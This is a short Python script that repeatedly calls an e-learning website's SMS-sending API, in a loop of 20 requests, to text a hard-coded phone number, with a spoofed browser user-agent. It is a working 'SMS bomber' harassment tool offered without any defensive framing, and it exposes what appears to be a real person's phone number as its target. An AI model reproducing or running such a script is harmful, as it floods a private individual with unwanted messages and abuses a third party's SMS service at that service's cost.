#!/usr/bin/python3
import requests
url = "https://ebooks.adda247.com/api/v1/sms/send?src=aweb"
header = {"user-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0","Content-Type":"application/json"}

payload = '{"to":"8788075620","messageType":"ADDA"}'
for i in range(1,21):
    data = requests.post(url,headers=header, data=payload,timeout=10,allow_redirects=True)
    print(data.status_code)
    print(i)
    print(data.text)

